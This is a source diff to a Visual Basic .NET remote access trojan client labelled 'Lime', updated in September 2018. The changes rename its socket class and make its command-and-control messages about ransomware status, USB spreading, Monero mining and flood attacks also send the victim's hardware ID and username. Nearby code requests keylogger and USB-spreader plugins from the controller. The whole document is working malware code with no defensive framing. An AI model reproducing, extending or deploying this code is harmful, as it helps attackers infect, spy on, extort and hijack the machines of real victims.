@@ -1,5 +1,5 @@
 ﻿'##################################################################
-'##        N Y A N   C A T  |||   Updated on Sept/14/2018        ##
+'##        N Y A N   C A T  |||   Updated on Sept/17/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -36,7 +36,7 @@
 Namespace Lime
 
     Public Class C_Main
-        Public Shared C As New C_Socket
+        Public Shared C As New C_TcpClient
         Public Shared SPL = C_Settings.SPL
 
 
@@ -66,7 +66,7 @@ Namespace Lime
 
                 Call C_Installation.INS()
 
-                C_Socket.T1.Start()
+                C_TcpClient.T1.Start()
 
 #Region "Plugins Threads"
 
@@ -119,14 +119,14 @@ Namespace Lime
             While True
 
 1:
-                    If C.CNT = True Then
+                    If C.Alive = True Then
                         Threading.Thread.CurrentThread.Sleep(3000)
                         'Compare old string with new string            
 
                         Try
                         If OldRans <> GTV("Rans-Status") Then
                             OldRans = GTV("Rans-Status")
-                            C.Send("!R" & SPL & OldRans)
+                            C.Send("!R" & SPL & OldRans + SPL + C_ID.HWID + SPL + C_ID.UserName)
                         End If
                     Catch ex As Exception
 
@@ -136,8 +136,8 @@ Namespace Lime
                             If C_Settings.USB Then
                                 If OldUSB <> GTV("USB").ToString Then
                                     OldUSB = GTV("USB")
-                                    C.Send("!SP" & SPL & OldUSB)
-                                End If
+                                C.Send("!SP" & SPL & OldUSB + SPL + C_ID.HWID + SPL + C_ID.UserName)
+                            End If
                             End If
                         Catch ex As Exception
                         End Try
@@ -145,7 +145,7 @@ Namespace Lime
                         Try
                         If OldXMR <> C_ID.XMR Then
                             OldXMR = C_ID.XMR
-                            C.Send("!X" & SPL & OldXMR)
+                            C.Send("!X" & SPL & OldXMR + SPL + C_ID.HWID + SPL + C_ID.UserName)
                         End If
                     Catch ex As Exception
                         End Try
@@ -153,8 +153,8 @@ Namespace Lime
                         Try
                             If OldFLD <> GTV("Flood").ToString Then
                                 OldFLD = GTV("Flood")
-                                C.Send("MSG" & SPL & "Flood! " & OldFLD)
-                                OldFLD = ""
+                            C.Send("MSG" & SPL & "Flood! " & OldFLD + SPL + C_ID.HWID + SPL + C_ID.UserName)
+                            OldFLD = ""
                                 STV("Flood", "")
                             End If
                         Catch ex As Exception
@@ -172,7 +172,7 @@ Namespace Lime
             Try
                 If GTV("_USB") = Nothing Then
                     While True
-                        If C.CNT = True Then
+                        If C.Alive = True Then
                             Threading.Thread.CurrentThread.Sleep(9000)
                             C.Send("PLUSB")
                             Exit While
@@ -191,7 +191,7 @@ Namespace Lime
             Try
                 If GTV("_PIN") = Nothing Then
                     While True
-                        If C.CNT = True Then
+                        If C.Alive = True Then
                             Threading.Thread.CurrentThread.Sleep(11000)
                             C.Send("PLPIN")
                             Exit While
@@ -211,7 +211,7 @@ Namespace Lime
             Try
                 If GTV("_KLG") = Nothing Then
                     While True
-                        If C.CNT = True Then
+                        If C.Alive = True Then
                             Threading.Thread.CurrentThread.Sleep(11000)
                             C.Send("PLKLG")
                             Exit While
